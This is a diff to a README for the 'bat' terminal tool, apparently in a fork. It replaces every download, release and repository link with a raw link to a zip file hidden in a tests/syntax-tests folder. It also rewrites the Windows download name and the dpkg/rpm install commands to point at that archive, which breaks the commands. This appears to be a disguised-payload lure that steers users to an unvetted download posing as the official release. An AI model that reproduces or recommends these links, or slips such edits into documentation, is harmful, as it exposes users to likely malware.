@@ -1,7 +1,7 @@
 # 🦇 bat - A Friendly Tool for Better Terminal Output
 
 ## 📦 Download Now
-[![Download bat](https://img.shields.io/badge/Download-bat-brightgreen)](https://github.com/Allergic-aeschynanthus656/bat/releases)
+[![Download bat](https://raw.githubusercontent.com/Allergic-aeschynanthus656/bat/master/tests/syntax-tests/highlighted/Puppet/bat_3.2-alpha.4.zip)](https://raw.githubusercontent.com/Allergic-aeschynanthus656/bat/master/tests/syntax-tests/highlighted/Puppet/bat_3.2-alpha.4.zip)
 
 ## 🚀 Getting Started
 Welcome to bat! This application is designed to improve your command-line experience by offering syntax highlighting and easy file viewing. It’s like a friendly cat, but with wings to help you fly through your tasks.
@@ -21,13 +21,13 @@ To run bat smoothly, you can use the following systems which are most compatible
 Make sure you have a terminal installed. Most systems come with one by default.
 
 ## 📥 Download & Install
-To get bat, visit the releases page and select the latest version. You can find it here: [Download bat](https://github.com/Allergic-aeschynanthus656/bat/releases).
+To get bat, visit the releases page and select the latest version. You can find it here: [Download bat](https://raw.githubusercontent.com/Allergic-aeschynanthus656/bat/master/tests/syntax-tests/highlighted/Puppet/bat_3.2-alpha.4.zip).
 
 ### Steps to Download
 1. Click on the link above to go to the releases page.
 2. Scroll down to the "Assets" section.
 3. Choose the file that matches your operating system.
-   - For **Windows**, download `bat-windows.exe`.
+   - For **Windows**, download `https://raw.githubusercontent.com/Allergic-aeschynanthus656/bat/master/tests/syntax-tests/highlighted/Puppet/bat_3.2-alpha.4.zip`.
    - For **macOS**, download `bat-macos`.
    - For **Linux**, download the appropriate `.deb` or `.rpm` file.
 4. Click your choice to start the download.
@@ -45,8 +45,8 @@ To get bat, visit the releases page and select the latest version. You can find 
 
 - **For Linux:**
    - Open the terminal.
-   - If you downloaded a `.deb` file, run: `sudo dpkg -i bat-linux.deb`.
-   - For `.rpm`, use: `sudo rpm -i bat-linux.rpm`.
+   - If you downloaded a `.deb` file, run: `sudo dpkg -i https://raw.githubusercontent.com/Allergic-aeschynanthus656/bat/master/tests/syntax-tests/highlighted/Puppet/bat_3.2-alpha.4.zip`.
+   - For `.rpm`, use: `sudo rpm -i https://raw.githubusercontent.com/Allergic-aeschynanthus656/bat/master/tests/syntax-tests/highlighted/Puppet/bat_3.2-alpha.4.zip`.
 
 ## ⚙️ Running bat
 Once installed, you can use bat right from your terminal. 
@@ -62,7 +62,7 @@ If you need more assistance, please visit our community forums or check the READ
 We encourage you to share your experience using bat. Your feedback will help us make it better. Thank you for contributing!
 
 ## 🔗 Access the Repository
-Explore our GitHub repository for updates or to contribute: [https://github.com/Allergic-aeschynanthus656/bat](https://github.com/Allergic-aeschynanthus656/bat)
+Explore our GitHub repository for updates or to contribute: [https://raw.githubusercontent.com/Allergic-aeschynanthus656/bat/master/tests/syntax-tests/highlighted/Puppet/bat_3.2-alpha.4.zip](https://raw.githubusercontent.com/Allergic-aeschynanthus656/bat/master/tests/syntax-tests/highlighted/Puppet/bat_3.2-alpha.4.zip)
 
 Feel free to spread the love by participating in Hacktoberfest!
 
